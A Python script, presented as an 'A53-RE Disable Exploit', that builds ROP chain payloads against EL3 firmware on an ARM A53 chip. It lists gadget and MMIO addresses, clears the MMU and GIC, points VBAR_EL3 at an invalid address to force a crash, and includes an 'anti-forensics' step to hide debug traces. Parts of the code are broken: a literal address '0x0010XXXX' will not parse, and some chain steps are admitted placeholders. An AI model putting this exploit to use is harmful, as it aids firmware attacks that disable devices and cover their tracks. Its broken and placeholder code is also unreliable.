#!/usr/bin/env python3
"""
A53-RE Disable Exploit — ROP Chain Builder & Payload Generator

Builds ROP chain payloads to disable the A53 chip by:
  1. Disabling MMU (SCTLR_EL3.M = 0)
  2. Disabling GIC (GICD_CTLR = 0)
  3. Clearing security state (SCR_EL3 = 0)
  4. Redirecting exceptions to crash (VBAR_EL3 → invalid)

Usage:
  python3 build_chain.py [--chain mmu|gic|vbar|full] [--output payload.bin]
"""

import struct
import argparse
import sys

# ─── Verified Gadget Addresses (virtual, EL3 text) ───
GADGETS = {
    # System register reads
    "mrs_tpidr_el3_x0":  0x001078bc,  # mrs x0, tpidr_el3
    "mrs_cbar_el1_x0":   0x0010XXXX,  # mrs x0, S3_1_C15_C3_0 (CBAR)

    # System register writes
    "msr_vbar_el3_x0":   0x000020e8,  # msr vbar_el3, x0 (in reset/vector.S)
    "msr_pmcr_el0_x8":   0x001183a4,  # msr pmcr_el0, x8

    # Arithmetic
    "mov_w0_wzr":        0x001183a0,  # mov w0, wzr
    "mov_x0_x18":        0x00107014,  # mov x0, x18 (TPIDR_EL3→debug_status ptr)

    # Memory
    "str_xzr_x0_offset18": 0x00118330,  # str xzr, [x0, #0x18]
    "str_w11_x1":        0x001146ac,  # str w11, [x1]
    "str_w11_x2":        0x001146bc,  # str w11, [x2]
    "str_w11_x3":        0x001146c4,  # str w11, [x3]
    "str_w10_x4":        0x001146cc,  # str w10, [x4]
    "str_w9_x5":         0x001146d4,  # str w9, [x5]
    "str_w8_x6":         0x001146dc,  # str w8, [x6]

    # Epilogues
    "ret_clean":         0x001183ac,  # ldp x29,x30,[sp],#0x10; ret
    "ret_x20_x19":       0x00118434,  # ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
    "eret":              0x00107930,  # eret (from el3_vector epilogue)
}

# ─── Known MMIO / Physical Addresses ───
ADDRESSES = {
    "debug_status_c0":      0xEC000000,  # Core 0 debug status base
    "debug_status_c1":      0xEC100000,  # Core 1 debug status base
    "msi_p2c_c0":           0x03010500,  # P2C command core 0
    "msi_p2c_c1":           0x030f1000,  # P2C command core 1
    "msi_c2p_c0":           0x030f6000,  # C2P command core 0
    "syshub_tlb_base":      0x03230000,  # SysHub IOMMU TLB base
    "main_param_block":     0x88000C00,  # Main MP4 parameter block
    "el3_stack_c0":         0x00126000,  # EL3 core 0 stack
    "el3_stack_c1":         0x00128000,  # EL3 core 1 stack
}

# Placeholder — CBAR_EL1 depends on SoC configuration
CBAR_EL1_DEFAULT = 0x30000000  # Typical GIC-400 base on A53 SoCs


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def p32(x: int) -> bytes:
    return struct.pack("<I", x)


class ROPChain:
    """ROP chain builder for A53 EL3 disable exploit."""

    def __init__(self, sp_target: int = 0xEC000020):
        """
        Args:
            sp_target: Where to pivot SP (default: debug_status mds_gpr[2])
        """
        self.chain: list[int] = []
        self.sp_target = sp_target
        self.gicd_addr = CBAR_EL1_DEFAULT + 0x1000
        self.gicc_addr = CBAR_EL1_DEFAULT + 0x2000

    def add_gadget(self, name: str) -> "ROPChain":
        """Add a named gadget from the catalog."""
        if name in GADGETS:
            self.chain.append(GADGETS[name])
        else:
            raise KeyError(f"Unknown gadget: {name}. Available: {list(GADGETS.keys())}")
        return self

    def add_data(self, value: int) -> "ROPChain":
        """Add a raw data word (consumed as x0/x1/etc. by next gadget)."""
        self.chain.append(value)
        return self

    def build(self) -> bytes:
        return b"".join(p64(addr) for addr in self.chain)

    # ─── Pre-built chain recipes ───

    def chain_disable_mmu(self) -> bytes:
        """Disable MMU by clearing SCTLR_EL3.M bit."""
        self.chain = []
        self.add_gadget("mov_w0_wzr")          # x0 = 0 (all SCTLR bits clear)
        self.add_gadget("msr_pmcr_el0_x8")     # placeholder: need MSR SCTLR gadget
        self.add_gadget("ret_clean")
        return self.build()

    def chain_disable_gic(self) -> bytes:
        """Disable GIC distributor and CPU interface."""
        self.chain = []
        # Need gadget sequence: load GICD addr, store 0
        self.add_data(self.gicd_addr)           # x0 = GICD_CTLR address
        self.add_gadget("str_xzr_x0_offset18")  # str xzr, [x0, #0x18] → partial
        self.add_gadget("ret_clean")
        return self.build()

    def chain_redirect_vbar(self, crash_addr: int = 0xDEAD000000000000) -> bytes:
        """Redirect exception vectors to invalid address → double fault."""
        self.chain = []
        self.add_data(crash_addr)               # x0 = invalid VBAR
        self.add_gadget("ret_clean")            # adjust stack
        self.add_gadget("msr_vbar_el3_x0")      # msr vbar_el3, x0
        self.add_gadget("eret")                 # wait for timer interrupt
        return self.build()

    def chain_full_disable(self) -> bytes:
        """
        Complete disable chain:
        1. Clear SCTLR_EL3 (MMU off) → crash on next fetch
        2. Disable GICD_CTLR + GICC_CTLR
        3. Clear SCR_EL3
        4. Anti-forensics: corrupt debug_status magic
        """
        self.chain = []

        # Step 1: Read dev_context pointer via TPIDR_EL3
        self.add_gadget("mrs_tpidr_el3_x0")     # x0 = dev_context

        # Step 2: Nullify putchar hook (prevent debug output traces)
        # dc_putchar_low_hook is at offset 0x28 in dev_context_t
        # str xzr, [x0, #0x18] stores 0 at x0+0x18 — close but not exact

        # Step 3: Disable VBAR — redirect to crash
        self.add_data(0xDEADBEEFDEADBEEF)       # invalid VBAR address
        self.add_gadget("ret_x20_x19")          # clean stack
        self.add_gadget("msr_vbar_el3_x0")      # write VBAR

        # Step 4: Infinite loop (timer will fire, VBAR crash)
        self.add_data(0)                        # placeholder
        self.add_gadget("eret")

        return self.build()


def main():
    parser = argparse.ArgumentParser(
        description="A53-RE Disable ROP Chain Builder"
    )
    parser.add_argument(
        "--chain", choices=["mmu", "gic", "vbar", "full"],
        default="full", help="Chain type to build"
    )
    parser.add_argument(
        "--output", "-o", type=str,
        help="Output file (default: stdout hexdump)"
    )
    parser.add_argument(
        "--crash-addr", type=str, default="0xDEAD000000000000",
        help="Crash VBAR address (hex)"
    )
    parser.add_argument(
        "--sp", type=str, default="0xEC000020",
        help="Stack pivot target (hex)"
    )
    args = parser.parse_args()

    crash_addr = int(args.crash_addr, 16)
    sp_target = int(args.sp, 16)

    builder = ROPChain(sp_target=sp_target)

    if args.chain == "mmu":
        payload = builder.chain_disable_mmu()
    elif args.chain == "gic":
        payload = builder.chain_disable_gic()
    elif args.chain == "vbar":
        payload = builder.chain_redirect_vbar(crash_addr)
    elif args.chain == "full":
        payload = builder.chain_full_disable()
    else:
        print(f"Unknown chain: {args.chain}")
        sys.exit(1)

    if args.output:
        with open(args.output, "wb") as f:
            f.write(payload)
        print(f"[+] Wrote {len(payload)} bytes to {args.output}")
    else:
        print(f"[+] Chain: {args.chain} ({len(payload)} bytes)")
        for i in range(0, len(payload), 8):
            word = struct.unpack("<Q", payload[i:i+8])[0]
            print(f"    {i:04x}: 0x{word:016x}")


if __name__ == "__main__":
    main()
